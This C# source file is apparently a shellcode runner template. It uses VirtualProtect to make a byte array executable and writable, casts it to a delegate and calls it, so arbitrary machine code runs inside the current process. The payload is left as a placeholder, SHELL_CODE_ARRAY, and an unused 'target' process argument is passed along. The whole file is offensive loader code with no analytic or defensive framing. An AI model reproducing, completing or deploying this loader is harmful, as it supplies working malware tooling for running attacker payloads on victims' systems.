using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    public class ShellcodeRunnerTechnique
    {
        public enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);

        private delegate void ShellcodeDelegate();
        public void Run(Process target, byte[] shellcode)
        {
            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)shellcode.Length, MemoryProtection.PAGE_EXECUTE_READWRITE, out MemoryProtection lpfOldProtect);
                    ShellcodeDelegate func = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(ShellcodeDelegate));
                    func();
                }
            }
        }
    }

    public class Program
    {
        static void Main(string[] args)
        {
            byte[] payload = { SHELL_CODE_ARRAY };
            Process target = Process.GetCurrentProcess();
            ShellcodeRunnerTechnique t = new ShellcodeRunnerTechnique();
            t.Run(target, payload);
        }
    }
}
